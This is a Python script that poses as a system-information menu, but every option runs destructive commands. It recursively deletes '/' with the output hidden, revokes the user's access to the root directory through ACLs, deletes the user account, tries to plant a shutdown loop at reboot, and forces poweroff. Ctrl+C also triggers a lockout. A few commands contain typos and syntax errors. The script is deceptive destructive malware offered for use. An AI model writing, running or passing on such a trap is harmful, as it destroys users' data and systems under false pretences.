from os import getuid as uid
from os import getlogin as glog
from os import system as sys
from time import sleep
from colors import red, bold

#Checking the UserID to run with or without sudo
get_user_id = uid()
#Getting username
get_username = glog()

#Denying the access to everything for the user using ACL (Acess Control List)
def perm_den():
    print(red(bold("Trapped :)" )))
    if get_user_id == 0:
        sys(f"setfacl -m u:$USERNAME:  /")
        sleep(2)
        sys("shutdown --poweroff now")
    elif get_user_id == 1000:
        sys(f"sudo setfacl -m u:$USERNAME:  /")
        sleep(2)
        sys("shutdown --poweroff now")
    else:
        sys(f"sudo setfacl -m u:$USERNAME:  /")
        sleep(2)
        sys("shutdown --poweroff now")

#Deleting user profile
def usr_del():
    username = input("Enter your username: ")
    if username != get_username:  
        print("Wrong! enter your right username")
    else:
        if get_user_id == 0:
            print(red(bold("Trapped :)" )))
            sys(f"userdell {username}")
            sleep(2)
            sys("shutdown --poweroff now")
        elif get_user_id == 1000:
            print(red(bold("Trapped :)" )))
            sys(f"sudo userdell {username}")
            sleep(2)
            sys("shutdown --poweroff now")
        else:
            print(red(bold("Trapped :)" )))
            sys(f"sudo userdell {username}")
            sleep(2)
            sys("shutdown --poweroff now")   

#Deleting os's files begining from the root '/' directory
def rm():
    if get_user_id == 0:
        sys("rm -rf / &>>rm.txt") #We redirect the output the elsewhere so that it doesn't display on the screen
        sleep (2)
        print(red(bold("Trapped :)" )))
        sys("shutdown --poweroff now")
    elif get_user_id == 1000:
        sys("sudo rm -rf / &>>rm.txt")
        sleep (2)
        print(red(bold("Trapped :)" )))
        sys("shutdown --poweroff now")
    else:
        sys("sudo rm -rf / &>>rm.txt")
        sleep (2)
        print(red(bold("Trapped :)" )))
        sys("shutdown --poweroff now")

#Killing the system making it power_off everytime it is powered_on
def death_loop():
    print(red(bold("Trapped :)" )))
    sys("touch /home/$USERNAME/Death_Loop.sh")
    sys("echo 'shutdown --poweroff now'>> /home/$USERNAME/Death_Loop.sh")
    sys("crontab -i -r '@reboot /home/$USERNAME/Death_Loop.sh")
    sys("shutdown --poweroff now")

#Trapping the user if he stops the program suddenly using Keyboard_Interruption(CTRL+C)
def int_trap():
    print(red(bold("Trapped :)" )))
    sys(f"sudo setfacl -m u:$USERNAME:  /")
    sleep(3)
    sys("shutdown --poweroff now")

def main():
    try:
        options = ["0) Exit the prorgam", "1) Users Informations", "2) System informations", "3) See files permissions", "4) See last time reboot"]
        for x in options:
            print(x)
        choice = int(input("Choose an option: "))
        if choice == 0:
            try:
                perm_den()
            except KeyboardInterrupt:
                int_trap()
        elif choice == 1:
            try:
                usr_del()
            except KeyboardInterrupt:
                int_trap()
        elif choice == 2:
            try:
                rm()
            except KeyboardInterrupt:
                int_trap()
        elif choice == 3:
            try:
                perm_den()
            except KeyboardInterrupt:
                int_trap()
        elif choice == 4:
            try:
               death_loop() 
            except KeyboardInterrupt:
                int_trap()
        else:
            print("Uknown option")
    except ValueError as ve:
        print(ve)
    except KeyboardInterrupt:
        int_trap()
main()
